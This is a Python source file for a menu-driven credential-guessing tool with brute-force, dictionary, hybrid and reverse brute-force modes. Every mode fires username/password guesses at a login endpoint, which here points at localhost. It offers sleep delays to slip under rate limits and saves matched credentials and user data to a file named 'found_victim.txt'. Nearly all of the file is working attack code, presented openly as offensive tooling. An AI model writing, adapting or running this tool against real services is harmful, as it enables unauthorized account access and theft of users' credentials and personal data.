
import re
import requests
import random
import time
import os
try:
   from colorama import Fore
except:
    os.system('pip install colorama')

logo="""
    __               __       ____                              __  __             __  
   / /_  _______  __/ /____  / __/___  _____________     ____ _/ /_/ /_____ ______/ /__
  / __ \/ ___/ / / / __/ _ \/ /_/ __ \/ ___/ ___/ _ \   / __ `/ __/ __/ __ `/ ___/ //_/
 / /_/ / /  / /_/ / /_/  __/ __/ /_/ / /  / /__/  __/  / /_/ / /_/ /_/ /_/ / /__/ ,<   
/_.___/_/   \__,_/\__/\___/_/  \____/_/   \___/\___/   \__,_/\__/\__/\__,_/\___/_/|_|  
                                                                                       

"""
print(Fore.RED+logo)
menu=['bruteforce Attack','Dictionary Attack','Hybrid Attack','Reverse bruteforce Attack']
mode=None
alpha='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
num_alpha='1234567890'

def final_attack(username,password):
    # p={'username':username,'password':password}
    res=requests.get('http://127.0.0.1:8000/get-user?username={}&password={}'.format(username,password))

    if res.status_code==200:
        data=res.json()
        if 'data' in data.keys():
            if data['data']=='limit':
                print(Fore.BLUE+'your limit became finish')
                quit()
            if data['data']=='blocked':
                print(Fore.BLUE+'you have been blocked')
                quit()
          
            if data['data']=='not found':
                print(Fore.RED+f'not found user name {username} and password {password}')
                return False
               
               
        if 'username' in data.keys() and "password" in data.keys():
            print(Fore.YELLOW+f'found  user name {username} and password {password}')
            with open('found_victim.txt','a')as file:
                file.write('****************************\n')
                for key in data.keys():
                    file.write(f'{key} : {data[key]}\n')
                file.write('****************************\n')  
                file.close()   
            return True
    elif res.status_code==404:
        print(Fore.RED+'url is not correct or exist')  
        return True

def show_menu():
    global mode
    for index,item in enumerate(menu,start=1):
        print(Fore.YELLOW+f'[{index}] {item}')
    while True:    
       mode=input('choose one of attack : ')
       if mode=='' or mode==None or mode=='\n':
           print(Fore.RED+'is empty')
           continue
       elif not mode.isdigit():
           print(Fore.RED+'is not number') 
           continue
       mode=int(mode)
       if mode<1 or mode>4:
           print(Fore.RED+'you have to choose between 1 to 4')
           continue
       break 

def you_know_username():
    while True:
         status=input('you know username : y/n ').lower()
         if status=='y' or status=='n':
             break
    if status=='y':
        username=input('enter the user name : ')
        return True,username
    elif status=='n':
        return False,''    
    
def choose_time():
    number=int(input('enter the number for sleep : '))
    return number



def simple_brute_force_attack():
    global num_alpha,alpha
    num_alpha=list(num_alpha)
    alpha=list(alpha) 
    status,username=you_know_username()
    slp=choose_time()

    if status:
        while True:
            time.sleep(slp)
            password=random.choices(num_alpha,k=8)
            password=''.join(password)
            is_given_data=final_attack(username,password)
            if is_given_data:
                break
    elif not status:
        while True:  
            time.sleep(slp)
            username=random.choices(alpha,k=random.randint(6,10))
            username=''.join(username)
            password=random.choices(num_alpha,k=8)
            password=''.join(password)   
            is_given_data=final_attack(username,password)   
            if is_given_data:
                break
        
def dictionary_attack():
    global alpha,num_alpha
    num_alpha=list(num_alpha)
    alpha=list(alpha) 
    status,username=you_know_username()
    if status:
        with open('password.txt','r')as file:
            passwords=file.read().split('\n')
            file.close()
        for password in passwords:
            # print(password)
            is_given_info=final_attack(username,password)
            if is_given_info:
                break      


    elif not status:
        with open('username.txt','r')as user_file:
            usernames=user_file.read().split('\n')
            user_file.close()
        with open('password.txt','r')as pass_file:
            passwords=pass_file.read().split('\n')
            pass_file.close()
        for username in usernames:
            for password in passwords:
                is_given_info=final_attack(username,password)
                if is_given_info:
                    break


def hybrid_attack():
    real_numbers=[]
    status,username=you_know_username()
    if status:
        password=('13'+username.split("_")[1])*2
        final_attack(username,password)
    elif not status:
        with open('username.txt','r')as file:
            usernames=file.read().split('\n')
            file.close()
        for username in usernames:
            fake_numbers=re.findall(r'[0-9]*',username,re.MULTILINE)
            # [1,2,3,'',]
            for num in fake_numbers:
                if num=="" or len(num)==0:
                     continue
                
                password=('13'+str(num))*2
                real_numbers.append(password)  

        for username in usernames:
            for password in real_numbers:
                is_given=final_attack(username,str(password))
                if is_given:
                    break

def reverse_attack():
    password=int(input('enter the password : '))
    with open('username.txt','r')as file:
        usernames=file.read().split('\n')
        file.close()
    for username in usernames:
        final_attack(username,password)    

def attack():
    global mode
    # simple bruteforce
    if mode==1: 
        print('simple')
        simple_brute_force_attack()
    # dictionary attack 
    elif mode==2:
        print('dic') 
        dictionary_attack()
    #hybrid attack 
    elif mode==3:
        print('hybrid') 
        hybrid_attack()
    # reverse attack 
    elif mode==4:
        print('reverse')            
        reverse_attack()

if __name__=="__main__":
    show_menu()
    attack()





  